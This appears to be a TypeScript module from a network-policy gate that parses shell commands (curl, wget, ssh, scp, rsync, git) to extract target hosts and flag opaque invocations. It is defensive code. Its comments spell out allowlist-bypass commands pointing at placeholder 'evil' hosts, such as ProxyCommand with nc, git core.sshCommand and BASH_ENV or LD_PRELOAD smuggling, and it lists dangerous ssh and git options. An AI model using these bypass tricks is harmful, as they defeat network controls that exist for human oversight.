	if (!looksLikeHostTarget(target)) {
		return null;
	}

	const scpStyleMatch = target.match(/^[^@\s]+@([^:/\s]+):/);
	if (scpStyleMatch?.[1]) {
		target = scpStyleMatch[1];
	} else {
		const sshUserHostMatch = target.match(
			/^[^@\s]+@([^:/\s]+)((?::\d+)?(?:\/.*)?)$/i,
		);
		if (sshUserHostMatch?.[1]) {
			target = `${sshUserHostMatch[1]}${sshUserHostMatch[2] ?? ""}`;
		}
	}

	if (!/^https?:\/\//i.test(target)) {
		target = `http://${target}`;
	}

	return cleanExtractedUrl(target);
}

// `^[A-Za-z]:[\\/]` is a Windows drive path (e.g. `C:\src` / `C:/src`).
// The scp `host:path` regex below would otherwise parse the drive letter
// as the remote host. Drive paths are local copies, not network targets.
const WINDOWS_DRIVE_PATH = /^[A-Za-z]:[\\/]/;

function scpStyleTargetToUrl(value: string): string | null {
	const target = value.trim().replace(/^["']|["']$/g, "");
	if (WINDOWS_DRIVE_PATH.test(target)) {
		return null;
	}
	const scpStyleMatch = target.match(
		/^(?:[^@\s]+@)?(\[[0-9a-f:.%]+\]|[^:/\s]+):(?:[^\s]*)$/i,
	);
	const host = scpStyleMatch?.[1];
	return host ? cleanExtractedUrl(`http://${host}`) : null;
}

function rsyncStyleTargetToUrl(value: string): string | null {
	const target = value.trim().replace(/^["']|["']$/g, "");
	// `rsync://[user@]host[:port]/path`
	const uriMatch = target.match(
		/^rsync:\/\/(?:[^@\s]+@)?(\[[0-9a-f:.%]+\]|[^:/\s]+)(?::\d+)?/i,
	);
	if (uriMatch?.[1]) {
		return cleanExtractedUrl(`http://${uriMatch[1]}`);
	}
	// daemon-style: `[user@]host::module[/path]` — exactly two colons separate
	// the host from the module name.
	const daemonMatch = target.match(
		/^(?:[^@\s]+@)?(\[[0-9a-f:.%]+\]|[^:/\s]+)::/,
	);
	if (daemonMatch?.[1]) {
		return cleanExtractedUrl(`http://${daemonMatch[1]}`);
	}
	return null;
}

function networkTargetToUrl(commandName: string, value: string): string | null {
	const url = targetToUrl(value);
	if (url) {
		return url;
	}
	if (commandName === "git" || commandName === "scp") {
		return scpStyleTargetToUrl(value);
	}
	if (commandName === "rsync") {
		return rsyncStyleTargetToUrl(value) ?? scpStyleTargetToUrl(value);
	}
	return null;
}

function isLocalGitTarget(value: string): boolean {
	const target = value.trim().replace(/^["']|["']$/g, "");
	return (
		target === "." ||
		target === ".." ||
		target.startsWith("./") ||
		target.startsWith("../") ||
		target.startsWith("/") ||
		target.startsWith("~/") ||
		target.startsWith("file://")
	);
}

function hasShellExpansion(value: string): boolean {
	return /[$`]|[<>]\(/.test(value);
}

function networkFlagTakesValue(commandName: string, flag: string): boolean {
	if (commandName === "curl" && (flag === "-i" || flag === "-p")) {
		return false;
	}
	if (commandName === "rsync") {
		// rsync's short-flag space barely overlaps with the curl/wget table
		// — many entries there (`-o`, `-i`, `-H`, `-c`, ...) are *boolean*
		// in rsync, so use a dedicated set and ignore the generic one.
		return RSYNC_FLAGS_WITH_VALUES.has(flag);
	}

	return FLAGS_WITH_VALUES.has(flag);
}

// Options whose value triggers a shell-out or otherwise lets the caller
// redirect the connection in opaque ways. OpenSSH config option names are
// case-insensitive — these entries are lowercased before lookup.
const OPAQUE_SSH_COMMAND_OPTIONS = new Set([
	"proxycommand",
	"remotecommand",
	"localcommand",
	"knownhostscommand",
	// Permits arbitrary local execution via the matching `LocalCommand` /
	// `~/.ssh/rc` mechanisms.
	"permitlocalcommand",
	// `Match exec <command>` runs the matcher's <command> at evaluation time.
	"match",
	// A pipe-prefixed `ControlPath` (`|cmd args`) executes the command.
	"controlpath",
	// Lets the caller smuggle env vars (e.g. `LD_PRELOAD=`) into the
	// child shell.
	"setenv",
	// Redirects the auth-agent socket — attacker socket can capture keys
	// or proxy to a different agent.
	"identityagent",
	// `Include` pulls additional config from a path the attacker chooses.
	"include",
	// Wholesale reassigns the user/host pair; `Hostname` is the canonical
	// "where the connection really goes" override.
	"hostname",
	// ProxyJump (-J) routes the connection through one or more bastion hosts
	// before reaching the positional destination. Like HostName, the static
	// positional check can't reason about the jumped-through hops, so any
	// presence forces fail-closed.
	"proxyjump",
]);

// scp shares OpenSSH's option parser and accepts the same opaque options.
const OPAQUE_SSH_CARRIER_COMMANDS = new Set(["ssh", "sftp", "scp"]);

function findOpaqueSshOption(
	commandName: string,
	args: string[],
): string | null {
	if (!OPAQUE_SSH_CARRIER_COMMANDS.has(commandName)) {
		return null;
	}

	for (let index = 0; index < args.length; index += 1) {
		const arg = args[index]!;

		let optionToken: string | null = null;
		if (arg === "-o" && index + 1 < args.length) {
			optionToken = args[index + 1]!;
			// Skip the next arg in the outer for-loop. The increment here is
			// in addition to the loop's own `+= 1`, so the net effect is
			// `index += 2` — one for the `-o` flag and one for its value.
			index += 1;
		} else if (arg.startsWith("-o") && arg.length > 2) {
			optionToken = arg.slice(2);
		} else if (arg === "-F" || arg.startsWith("-F")) {
			// `-F path` (or `-Fpath`) selects an alternate ssh_config file. An
			// attacker-controlled config can contain `ProxyCommand=...` etc.,
			// so we treat any non-default config file as opaque. The legitimate
			// `-F /dev/null` and `-F none` forms (disable config) are
			// explicitly allowed.
			const inline = arg === "-F" ? args[index + 1] : arg.slice(2);
			if (arg === "-F") {
				index += 1;
			}
			if (inline && inline !== "/dev/null" && inline !== "none") {
				return `-F ${inline}`;
			}
			continue;
		} else if (arg === "-J" || arg.startsWith("-J")) {
			// `-J host[,host2…]` is the ProxyJump shorthand for
			// `-o ProxyJump=host`. Any presence is opaque for the same reason
			// as the long form — the connection actually traverses the jump
			// hosts, which the positional-host check can't reason about.
			const inline = arg === "-J" ? args[index + 1] : arg.slice(2);
			if (arg === "-J") {
				index += 1;
			}
			if (inline) {
				return `-J ${inline}`;
			}
			continue;
		} else if (arg === "-W" || arg.startsWith("-W")) {
			// `-W host:port` forwards client stdio over the secure channel to
			// `host:port`, so the effective TCP destination is that
			// `host:port` rather than (only) the positional ssh server. The
			// positional check only validates the ssh server, so any presence
			// is opaque.
			const inline = arg === "-W" ? args[index + 1] : arg.slice(2);
			if (arg === "-W") {
				index += 1;
			}
			if (inline) {
				return `-W ${inline}`;
			}
			continue;
		}

		if (!optionToken) {
			continue;
		}

		// OpenSSH ignores leading whitespace before parsing the `key=value`
		// payload, so normalize that first before splitting on the first
		// whitespace or `=` separator.
		const normalizedOptionToken = optionToken.trimStart();
		const separatorMatch = normalizedOptionToken.match(/[\s=]/);
		const rawKey = separatorMatch
			? normalizedOptionToken.slice(0, separatorMatch.index)
			: normalizedOptionToken;
		const key = rawKey?.trim().toLowerCase();
		if (key && OPAQUE_SSH_COMMAND_OPTIONS.has(key)) {
			return rawKey?.trim() ?? key;
		}
	}

	return null;
}

// `rsync` doesn't accept OpenSSH-style `-o` options, but it does take a
// `-e COMMAND` / `--rsh=COMMAND` value that is invoked verbatim as the
// transport shell — the canonical bypass is
// `rsync -e 'ssh -o ProxyCommand=nc evil 22' src user@allowed:/dst`.
// We treat any `-e` / `--rsh=` value other than the literal `ssh` default
// as opaque: the value is a free-form shell command, so once it diverges
// from the well-known default we can no longer reason about which host
// the rsync invocation actually reaches.
function findOpaqueRsyncOption(
	commandName: string,
	args: string[],
): string | null {
	if (commandName !== "rsync") {
		return null;
	}

	for (let index = 0; index < args.length; index += 1) {
		const arg = args[index]!;

		let value: string | null = null;
		let display: string | null = null;
		if (arg === "-e" && index + 1 < args.length) {
			value = args[index + 1]!;
			display = `-e ${value}`;
			index += 1;
		} else if (arg.startsWith("-e") && arg.length > 2) {
			value = arg.slice(2);
			display = arg;
		} else if (arg === "--rsh" && index + 1 < args.length) {
			value = args[index + 1]!;
			display = `--rsh ${value}`;
			index += 1;
		} else if (arg.startsWith("--rsh=")) {
			value = arg.slice("--rsh=".length);
			display = arg;
		}

		if (value === null) {
			continue;
		}

		const normalized = value.trim().replace(/^["']|["']$/g, "");
		if (normalized === "ssh") {
			continue;
		}

		return display ?? value;
	}

	return null;
}

// `curl` and `wget` both accept config-file flags whose contents are
// arbitrary directives (proxy, DNS overrides, redirects, etc.). Treat any
// reference to a non-default config file as opaque — analogous to ssh's
// `-F` handling — because the directives inside the file cannot be
// statically validated against the allowlist.
//
// `curl --resolve HOST:PORT:IP` and `curl --connect-to HOST:PORT:H2:P2`
// also bypass the host check by remapping the TCP destination without
// changing the request's Host header. Same fail-closed posture as
// ssh's `HostName`/`ProxyJump`.
//
// `wget -e EXPR` / `wget --execute=EXPR` evaluates a .wgetrc-style
// directive in the same way `--config` does, so we treat it the same.
const CURL_OPAQUE_LONG_FLAGS = new Set([
	"--resolve",
	"--connect-to",
	"--config",
]);
const WGET_OPAQUE_LONG_FLAGS = new Set(["--config", "--execute"]);

function findOpaqueHttpClientOption(
	commandName: string,
	args: string[],
): string | null {
	if (commandName !== "curl" && commandName !== "wget") {
		return null;
	}

	const longFlags =
		commandName === "curl" ? CURL_OPAQUE_LONG_FLAGS : WGET_OPAQUE_LONG_FLAGS;

	for (let index = 0; index < args.length; index += 1) {
		const arg = args[index]!;

		// Long-form flag with explicit `=value`.
		for (const flag of longFlags) {
			if (arg.startsWith(`${flag}=`)) {
				const value = arg.slice(flag.length + 1);
				if (flag === "--config" && (value === "/dev/null" || value === "")) {
					continue;
				}
				return arg;
			}
		}

		// Long-form flag followed by a separate value token.
		if (longFlags.has(arg)) {
			const value = args[index + 1];
			index += 1;
			if (
				arg === "--config" &&
				(value === undefined || value === "/dev/null" || value === "")
			) {
				continue;
			}
			return value ? `${arg} ${value}` : arg;
		}

		// Short forms: `curl -K FILE`, `curl -KFILE`, `wget -e EXPR`.
		if (commandName === "curl" && (arg === "-K" || arg.startsWith("-K"))) {
			if (arg === "-K") {
				const value = args[index + 1];
				index += 1;
				if (value === undefined || value === "/dev/null" || value === "") {
					continue;
				}
				return `-K ${value}`;
			}
			if (arg.length > 2) {
				const value = arg.slice(2);
				if (value === "/dev/null") {
					continue;
				}
				return arg;
			}
		}

		if (commandName === "wget" && (arg === "-e" || arg.startsWith("-e"))) {
			if (arg === "-e") {
				const value = args[index + 1];
				index += 1;
				if (value === undefined || value === "") {
					continue;
				}
				return `-e ${value}`;
			}
			if (arg.length > 2) {
				return arg;
			}
		}
	}

	return null;
}

// `git -c` lets the caller set any git config key, including the ones that
// resolve to a shell command. The canonical bypass is
// `git -c core.sshCommand='nc evil 22' clone ...` — the matched
// subcommand-args path never sees those values because git's parser
// consumes the `-c` before reaching the subcommand. Mirror that here.
const OPAQUE_GIT_CONFIG_KEYS = new Set([
	"core.sshcommand",
	"protocol.ext.allow",
	"gpg.ssh.allowedsignerscommand",
	"gpg.ssh.revocationfile",
	"gpg.program",
	"credential.helper",
	"http.proxy",
	"http.proxysslcainfo",
	"http.proxysslcert",
	"http.proxysslkey",
	"http.sslcainfo",
	"url.<base>.insteadof",
]);

function findOpaqueGitConfigOption(args: string[]): string | null {
	for (let index = 0; index < args.length; index += 1) {
		const arg = args[index]!;

		let value: string | null = null;
		let display = "-c";
		if (arg === "-c" && index + 1 < args.length) {
			value = args[index + 1]!;
			index += 1;
		} else if (arg.startsWith("-c") && arg !== "-c") {
			value = arg.slice(2);
		} else if (arg === "--config-env" && index + 1 < args.length) {
			// `git --config-env <KEY>=<ENVVAR>` is the env-indirected form of
			// `-c <KEY>=<value>` — same shell-out risk, different syntax.
			// Treat it identically and only look at the <KEY> half.
			value = args[index + 1]!;
			display = "--config-env";
			index += 1;
		} else if (arg.startsWith("--config-env=")) {
			value = arg.slice("--config-env=".length);
			display = "--config-env";
		} else {
			const [flag] = arg.split("=", 1);
			if (
				flag &&
				GIT_GLOBAL_FLAGS_WITH_VALUES.has(flag) &&
				!arg.includes("=") &&
				index + 1 < args.length
			) {
				index += 1;
			}
		}

		// Stop scanning when we reach the git subcommand — anything after
		// that is its own argument set.
		if (!arg.startsWith("-")) {
			return null;
		}

		if (!value) {
			continue;
		}

		const [rawKey] = value.split("=", 1);
		const key = rawKey?.trim().toLowerCase();
		if (!key) {
			continue;
		}
		// Direct match — keep the exhaustive list focused on shell-out and
		// signing/credential redirection vectors.
		if (OPAQUE_GIT_CONFIG_KEYS.has(key)) {
			return `${display} ${rawKey?.trim() ?? key}`;
		}
		// `url.<base>.insteadOf` rewrites the URL silently and is keyed by
		// the attacker-chosen `<base>`, so match by suffix instead of the
		// placeholder entry above.
		if (
			key.startsWith("url.") &&
			(key.endsWith(".insteadof") || key.endsWith(".pushinsteadof"))
		) {
			return `${display} ${rawKey?.trim() ?? key}`;
		}
	}

	return null;
}

function nonFlagArgs(commandName: string, args: string[]): string[] {
	const values: string[] = [];
	let skipNext = false;

	for (const arg of args) {
		if (skipNext) {
			skipNext = false;
			continue;
		}

		if (arg.startsWith("-")) {
			if (!arg.includes("=") && networkFlagTakesValue(commandName, arg)) {
				skipNext = true;
			}
			continue;
		}

		values.push(arg);
	}

	return values;
}

function gitCloneNonFlagArgs(args: string[]): string[] {
	return gitNonFlagArgs(args, GIT_CLONE_FLAGS_WITH_VALUES);
}

function gitNonFlagArgs(
	args: string[],
	flagsWithValues: Set<string>,
): string[] {
	const values: string[] = [];
	let skipNext = false;
	let optionsEnded = false;

	for (const arg of args) {
		if (skipNext) {
			skipNext = false;
			continue;
		}

		if (!optionsEnded && arg === "--") {
			optionsEnded = true;
			continue;
		}

		if (!optionsEnded && arg.startsWith("-")) {
			const [flag] = arg.split("=", 1);
			if (flag && flagsWithValues.has(flag) && !arg.includes("=")) {
				skipNext = true;
			}
			continue;
		}

		values.push(arg);
	}

	return values;
}

function gitRemoteTargetArgs(args: string[]): string[] {
	const targets = gitNonFlagArgs(args, GIT_REMOTE_ADD_FLAGS_WITH_VALUES);
	const action = targets[0]?.toLowerCase();
	if (action === "add") {
		return targets.slice(2, 3);
	}
	if (action === "set-url") {
		return targets.slice(2);
	}
	if (action && !GIT_REMOTE_LOCAL_ACTIONS.has(action)) {
		return targets.slice(0, 1);
	}
	return [];
}

function gitConfigTargetArgs(args: string[]): string[] {
	const targets = gitNonFlagArgs(args, GIT_CONFIG_FLAGS_WITH_VALUES);
	const key = targets[0];
	if (!key || targets.length < 2) {
		return [];
	}

	const rewriteTarget = key.match(
		/^url\.(.+)\.(?:insteadof|pushinsteadof)$/i,
	)?.[1];
	if (rewriteTarget) {
		return [rewriteTarget];
	}

	if (
		/^remote\..+\.(?:push)?url$/i.test(key) ||
		/^submodule\..+\.url$/i.test(key)
	) {
		return targets.slice(1, 2);
	}

	return [];
}

function gitConfigCommandIsLocal(args: string[]): boolean {
	return gitConfigTargetArgs(args).length === 0;
}

function gitRemoteCommandIsLocal(args: string[]): boolean {
	const targets = gitNonFlagArgs(args, GIT_REMOTE_ADD_FLAGS_WITH_VALUES);
	const action = targets[0]?.toLowerCase();
	if (!action || GIT_REMOTE_LOCAL_ACTIONS.has(action)) {
		return true;
	}
	if (action === "add") {
		return targets.length < 3;
	}
	if (action === "set-url") {
		return targets.length < 3;
	}
	return false;
}

function gitSubmoduleTargetArgs(args: string[]): string[] {
	const targets = gitNonFlagArgs(args, GIT_SUBMODULE_ADD_FLAGS_WITH_VALUES);
	const action = targets[0]?.toLowerCase();
	if (!action || GIT_SUBMODULE_LOCAL_ACTIONS.has(action)) {
		return [];
	}
	if (action === "add") {
		return targets.slice(1, 2);
	}
	return targets.slice(0, 1);
}

function gitSubmoduleCommandIsLocal(args: string[]): boolean {
	const targets = gitNonFlagArgs(args, GIT_SUBMODULE_ADD_FLAGS_WITH_VALUES);
	const action = targets[0]?.toLowerCase();
	return !action || GIT_SUBMODULE_LOCAL_ACTIONS.has(action);
}

function gitArchiveTargetArgs(args: string[]): string[] {
	const targets: string[] = [];

	for (let index = 0; index < args.length; index += 1) {
		const arg = args[index]!;
		if (arg === "--remote" && index + 1 < args.length) {
			targets.push(args[index + 1]!);
			index += 1;
			continue;
		}
		if (arg.startsWith("--remote=")) {
			const target = arg.slice("--remote=".length);
			if (target) {
				targets.push(target);
			}
		}
	}

	return targets;
}

function networkTargetArgs(
	commandName: string,
	args: string[],
	gitSubcommand: string | null,
): string[] {
	const targets =
		commandName === "git" && gitSubcommand === "clone"
			? gitCloneNonFlagArgs(args)
			: nonFlagArgs(commandName, args);

	if (commandName === "git") {
		if (gitSubcommand === "archive") {
			return gitArchiveTargetArgs(args);
		}
		if (gitSubcommand === "config") {
			return gitConfigTargetArgs(args);
		}
		if (gitSubcommand === "remote") {
			return gitRemoteTargetArgs(args);
		}
		if (gitSubcommand === "submodule") {
			return gitSubmoduleTargetArgs(args);
		}
		return targets.slice(0, 1);
	}

	if (commandName === "scp") {
		// scp uses the generic flag table, so the positionals returned by
		// `nonFlagArgs` already correspond to the user's source/destination
		// list. Filter for ones that look like remote endpoints.
		return targets.filter(
			(arg) => networkTargetToUrl(commandName, arg) !== null,
		);
	}

	if (commandName === "rsync") {
		// rsync has its own flag table (`RSYNC_FLAGS_WITH_VALUES`) so the
		// nonFlagArgs parser correctly skips the values of `--exclude`,
		// `--info`, `-f`, `-B`, etc. The bypass Cursor Bugbot flagged on
		// PR #2756 is the symmetric case: an attacker writes
		// `rsync --exclude user@evil.com:/src /local`. The parser eats
		// `user@evil.com:/src` as `--exclude`'s value, leaves `/local` as
		// the only positional, and `rsyncCommandIsLocal` classifies the
		// command as fully local — so the remote never reaches the
		// allowlist gate.
		//
		// Defense in depth: scan ALL args (not just positionals) for
		// tokens that look like remote endpoints. False positives are
		// acceptable (a deliberate `--exclude` pattern that happens to
		// resemble `user@host:path` will be policy-checked; the user can
		// adjust their pattern or allowlist). False *negatives* are not.
		return args.filter((arg) => networkTargetToUrl(commandName, arg) !== null);
	}

	if (
		commandName === "nc" ||
		commandName === "ncat" ||
		commandName === "netcat" ||
		commandName === "ssh" ||
		commandName === "sftp" ||
		commandName === "telnet" ||
		commandName === "ftp"
	) {
		return targets.slice(0, 1);
	}

	return targets;
}

function scpCommandIsLocal(args: string[]): boolean {
	const targets = nonFlagArgs("scp", args);
	return (
		targets.length > 0 &&
		targets.every((arg) => {
			const target = arg.trim().replace(/^["']|["']$/g, "");
			if (target.length === 0 || hasShellExpansion(target)) {
				return false;
			}
			if (/^scp:\/\//i.test(target)) {
				return false;
			}
			// Windows drive paths like `C:\src` legitimately contain a colon
			// but are local. Anything else with a colon is treated as a
			// potential remote scp host.
			if (WINDOWS_DRIVE_PATH.test(target)) {
				return true;
			}
			return !target.includes(":");
		})
	);
}

function rsyncCommandIsLocal(args: string[]): boolean {
	const targets = nonFlagArgs("rsync", args);
	return (
		targets.length > 0 &&
		targets.every((arg) => {
			const target = arg.trim().replace(/^["']|["']$/g, "");
			if (target.length === 0 || hasShellExpansion(target)) {
				return false;
			}
			// `rsync://…` and the daemon-style `host::module/path` syntaxes
			// both reach the network.
			if (/^rsync:\/\//i.test(target) || target.includes("::")) {
				return false;
			}
			if (WINDOWS_DRIVE_PATH.test(target)) {
				return true;
			}
			// A single colon (with no leading scheme) is rsync's ssh-style
			// `host:path` notation; treat it as remote.
			return !target.includes(":");
		})
	);
}

function nextGitSubcommandToken(
	args: string[],
): { subcommand: string; args: string[] } | null {
	for (let index = 0; index < args.length; index += 1) {
		const arg = args[index]!;
		if (arg === "--") {
			continue;
		}

		const [flag] = arg.split("=", 1);
		if (
			flag &&
			GIT_GLOBAL_FLAGS_WITH_VALUES.has(flag) &&
			!arg.includes("=") &&
			index + 1 < args.length
		) {
			index += 1;
			continue;
		}
		if (arg.startsWith("-c") && arg !== "-c") {
			continue;
		}
		if (arg.startsWith("--")) {
			continue;
		}
		if (arg.startsWith("-")) {
			continue;
		}

		const subcommand = arg.toLowerCase();
		return { subcommand, args: args.slice(index + 1) };
	}

	return null;
}

function gitSubcommandInvocation(
	args: string[],
): { subcommand: string; args: string[] } | null {
	const invocation = nextGitSubcommandToken(args);
	if (!invocation) {
		return null;
	}

	if (NETWORK_GIT_SUBCOMMANDS.has(invocation.subcommand)) {
		return invocation;
	}

	if (!GIT_NESTED_SUBCOMMAND_WRAPPERS.has(invocation.subcommand)) {
		return null;
	}

	const nestedInvocation = nextGitSubcommandToken(invocation.args);
	return nestedInvocation &&
		NETWORK_GIT_SUBCOMMANDS.has(nestedInvocation.subcommand)
		? nestedInvocation
		: null;
}

/**
 * Extract URLs from any value recursively.
 *
 * Handles strings, arrays, and objects. URLs are cleaned of trailing
 * punctuation that commonly gets captured in regex matches.
 *
 * @example
 * extractUrlsFromValue("Check https://example.com for details")
 * // Returns: ["https://example.com"]
 *
 * extractUrlsFromValue({ url: "https://api.example.com", nested: { link: "https://other.com" } })
 * // Returns: ["https://api.example.com", "https://other.com"]
 *
 * @param value - Value to extract URLs from (string, array, or object)
 * @returns Array of extracted URLs
 */
export function extractUrlsFromValue(value: unknown): string[] {
	const urls: string[] = [];

	function extract(val: unknown): void {
		if (typeof val === "string") {
			const matches = val.match(URL_PATTERN);
			if (matches) {
				for (const match of matches) {
					// Trim common trailing punctuation that gets captured
					urls.push(cleanExtractedUrl(match));
				}
			}
		} else if (Array.isArray(val)) {
			for (const item of val) {
				extract(item);
			}
		} else if (val && typeof val === "object") {
			for (const v of Object.values(val)) {
				extract(v);
			}
		}
	}

	extract(value);
	return urls;
}

/**
 * Extract URLs from curl/wget shell commands.
 *
 * Parses command arguments and extracts URL-like strings.
 * Automatically adds http:// prefix for bare hostnames.
 *
 * @example
 * extractUrlsFromShellCommand("curl https://api.example.com/data")
 * // Returns: ["https://api.example.com/data"]
 *
 * extractUrlsFromShellCommand("wget example.com/file.txt")
 * // Returns: ["http://example.com/file.txt"]
 *
 * extractUrlsFromShellCommand("curl -X POST https://api.example.com -d '{}'")
 * // Returns: ["https://api.example.com"]
 *
 * @param command - Shell command string
 * @returns Array of extracted URLs
 */
export function extractUrlsFromShellCommand(command: string): string[] {
	const urls: string[] = [];

	for (const segment of allCommandSegments(command)) {
		const invocation = unwrapNetworkInvocation(segment);
		if (!invocation) {
			continue;
		}

		let args = invocation.args;
		let gitSubcommand: string | null = null;
		if (invocation.commandName === "git") {
			const gitInvocation = gitSubcommandInvocation(args);
			if (!gitInvocation) {
				continue;
			}
			args = gitInvocation.args;
			gitSubcommand = gitInvocation.subcommand;
		}

		for (const arg of networkTargetArgs(
			invocation.commandName,
			args,
			gitSubcommand,
		)) {
			const url = networkTargetToUrl(invocation.commandName, arg);
			if (url) {
				urls.push(url);
			}
		}
	}

	return [...new Set(urls)];
}

function tokensBeforeShellComment(segment: string[]): string[] {
	const commentIndex = segment.findIndex((token) => token.startsWith("#"));
	if (commentIndex === -1) return segment;
	// INCLUDE the suspect comment-start token in the returned slice. The
	// tokenizer strips quotes before we see segments, so a real shell
	// comment (`echo hi # see https://wiki/page`) and a quoted token that
	// happens to start with `#` (`echo "#prefix https://evil.com"`) are
	// indistinguishable at this point. Dropping the token would let an
	// adversary smuggle URLs past `blockedHosts` by prefixing them with
	// `#` inside a quoted argument; keeping it adds a tolerable amount of
	// false positives for the rare agent tool call that embeds a URL
	// inside an actual `# comment` (which is conservative for security
	// policy anyway). Tokens AFTER the comment-start are still dropped.
	return segment.slice(0, commentIndex + 1);
}

/**
 * Extract URL substrings from shell command text while respecting shell comments.
 *
 * This catches URLs embedded inside quoted strings, echo payloads, and heredoc
 * bodies without treating `# ...` comment text as an executed network target.
 */
export function extractUrlSubstringsFromShellCommand(
	command: string,
): string[] {
	const urls: string[] = [];

	for (const segment of allCommandSegments(command)) {
		urls.push(...extractUrlsFromValue(tokensBeforeShellComment(segment)));
	}

	return [...new Set(urls)];
}

export function findOpaqueNetworkShellCommand(command: string): string | null {
	const segments = allCommandSegments(command);

	// Pass 1: specific opaque markers. When a nested segment carries a
	// known smuggle (`ssh -o ProxyCommand=…`, `git -c core.sshcommand=…`,
	// `BASH_ENV=…`, …) we surface THAT segment, not the wrapper around
	// it — display fidelity matters for the operator triaging the block.
	const specific = findOpaqueByMarker(segments);
	if (specific) {
		return specific;
	}

	// Pass 2: indirection / encoding-resistance fallback. `eval`,
	// `python -c "$CMD"`, `… | sh`, `bash <<<`, `sh /tmp/script`. These
	// don't expose a parseable inner network invocation, but the runtime
	// they hand off to can still issue any network call. Flag them so
	// the policy gate sees the smoke even when we can't parse the fire.
	for (const segment of segments) {
		const indirection = findOpaqueIndirection(segment);
		if (indirection) {
			return indirection;
		}
	}

	return null;
}

function findOpaqueByMarker(segments: string[][]): string | null {
	for (const segment of segments) {
		// Bash-style bare env-var prefix attached to a shell wrapper:
		// `BASH_ENV=/tmp/evil bash -c 'curl evil.com'`. The outer
		// `bash` is not in `NETWORK_COMMANDS` so `unwrapNetworkInvocation`
		// returns null for the outer segment, and the nested `curl …`
		// segment doesn't carry the env any more. Catch the dangerous
		// env at the segment level before we discard it. (This also
		// covers `LD_PRELOAD=/tmp/evil ./binary` style invocations where
		// the wrapped command isn't a recognized network command — the
		// LD_PRELOAD inline is itself the smuggle.)
		if (
			segment.length > 0 &&
			isEnvAssignment(segment[0]!) &&
			findOpaqueEnvAssignment(segment)
		) {
			return segment.join(" ");
		}

		const invocation = unwrapNetworkInvocation(segment);
		if (!invocation) {
			continue;
		}

		let args = invocation.args;
		let gitSubcommand: string | null = null;
		if (invocation.commandName === "git") {
			// `git -c key=value` is consumed by git before it reaches the
			// subcommand. We scan the *original* args so values like
			// `core.sshCommand` are caught even when the subcommand itself
			// is otherwise innocuous (e.g. `clone`, `fetch`, `push`).
			if (findOpaqueGitConfigOption(args)) {
				return invocation.display.join(" ");
			}
			const gitInvocation = gitSubcommandInvocation(args);
			if (!gitInvocation) {
				continue;
			}
			args = gitInvocation.args;
			gitSubcommand = gitInvocation.subcommand;
		}

		// Bash-style bare env-var prefix: `VAR=value cmd …` may smuggle
		// a transport override (`GIT_SSH_COMMAND=…`, `RSYNC_RSH=…`) or
		// a loader hijack (`LD_PRELOAD=…`) past the host check.
		// `invocation.display` is the original segment (pre-prefix-strip)
		// so the env tokens are still visible here.
		if (findOpaqueEnvAssignment(invocation.display)) {
			return invocation.display.join(" ");
		}

		if (findOpaqueSshOption(invocation.commandName, args)) {
			return invocation.display.join(" ");
		}

		if (findOpaqueRsyncOption(invocation.commandName, args)) {
			return invocation.display.join(" ");
		}

		if (findOpaqueHttpClientOption(invocation.commandName, args)) {
			return invocation.display.join(" ");
		}

		const targets = networkTargetArgs(
			invocation.commandName,
			args,
			gitSubcommand,
		);
		if (targets.length === 0) {
			if (
				(invocation.commandName === "git" &&
					(gitSubcommand === "archive" ||
						(gitSubcommand === "config" && gitConfigCommandIsLocal(args)) ||
						(gitSubcommand === "remote" && gitRemoteCommandIsLocal(args)) ||
						(gitSubcommand === "submodule" &&
							gitSubmoduleCommandIsLocal(args)))) ||
				(invocation.commandName === "scp" && scpCommandIsLocal(args)) ||
				(invocation.commandName === "rsync" && rsyncCommandIsLocal(args))
			) {
				continue;
			}
		}

		if (targets.length > 0) {
			if (
				URL_POSITIONAL_COMMANDS.has(invocation.commandName) &&
				targets.some((arg) =>
					networkTargetToUrl(invocation.commandName, arg),
				) &&
				targets.every(
					(arg) =>
						networkTargetToUrl(invocation.commandName, arg) ||
						!hasShellExpansion(arg),
				)
			) {
				continue;
			}

			const allTargetsAreStatic = targets.every((arg) => {
				if (networkTargetToUrl(invocation.commandName, arg)) {
					return true;
				}
				return invocation.commandName === "git" && isLocalGitTarget(arg);
			});
			if (allTargetsAreStatic) {
				continue;
			}
		}

		return invocation.display.join(" ");
	}

	return null;
}

/**
 * Extract all URLs from text, objects, and embedded shell commands.
 *
 * Combines URL extraction from values and shell command parsing.
 * Use this when you need comprehensive URL extraction from mixed content.
 *
 * @param value - Value to extract URLs from
 * @param shellCommand - Optional shell command to also parse
 * @returns Array of all extracted URLs (deduplicated)
 */
export function extractAllUrls(
	value: unknown,
	shellCommand?: string,
): string[] {
	const urls = extractUrlsFromValue(value);

	if (shellCommand) {
		urls.push(...extractUrlsFromShellCommand(shellCommand));
	}

	// Deduplicate
	return [...new Set(urls)];
}
